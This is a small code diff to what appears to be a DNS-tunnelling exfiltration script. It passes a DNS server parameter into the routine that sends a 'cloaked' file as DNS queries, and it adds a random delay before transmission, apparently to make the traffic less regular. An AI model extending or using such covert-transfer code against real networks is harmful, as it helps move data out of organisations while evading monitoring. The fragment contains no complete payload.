@@ -61,13 +61,13 @@ def SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile ):
 #
 #========================================================================
 
-def TransferCloakedFile( cloakedFile, queryDelay ):
-
+def TransferCloakedFile( cloakedFile, queryDelay, dns ):
+	time.sleep(random.uniform(0, 2))
 	print("")
 	print("Broadcasting response...")
 	print("")
 
-	status = GenerateDNSQueries( cloakedFile,  queryDelay )
+	status = GenerateDNSQueries( cloakedFile,  queryDelay, dns )
 
 
 
